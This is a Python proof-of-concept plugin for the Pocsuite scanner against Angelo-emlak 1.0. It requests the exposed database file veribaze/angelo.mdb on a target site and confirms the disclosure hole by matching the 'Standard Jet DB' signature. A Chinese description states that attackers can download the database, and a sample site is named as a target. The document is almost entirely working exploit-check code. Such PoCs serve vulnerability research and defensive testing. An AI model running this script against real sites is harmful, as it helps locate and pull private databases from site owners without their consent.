#!/usr/bin/env python
# -*- coding:utf-8 -*-
import re
from pocsuite.net import req
from pocsuite.poc import Output, POCBase
from pocsuite.utils import register


class Angelo_emlak_Database_Found(POCBase):
    vulID = '67229'
    version = '1'
    vulDate = '2010-04-27'
    author = 'anonymous'
    createDate = '2015-11-15'
    updateDate = '2015-11-15'
    references = ['http://www.sebug.net/vuldb/ssvid-67229']
    name = 'Angelo-emlak 1.0 - Database Disclosure Vulnerability'
    appPowerLink = ''
    appName = 'Angelo-emlak'
    appVersion = ' '
    vulType = 'Database Found'
    desc = 'Angelo-Emlak在web根目录下保存敏感信息，但缺乏足够的访问控制，远程攻击者可以通过直接向veribaze/angelo.mdb发出请求，下载数据库。'
    samples = ['http://burdurdaemlak.com']


    def _attack(self):
        return self._verify()


    def _verify(self):
        result = {}
        vul_url = '%s/veribaze/angelo.mdb' % self.url
        response = req.get(vul_url).content

        if re.search('Standard Jet DB', response):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url

        return self.parse_attack(result)


    def parse_attack(self, result):
        output = Output(self)

        if result:
            output.success(result)
        else:
            output.fail('failed')

        return output

register(Angelo_emlak_Database_Found)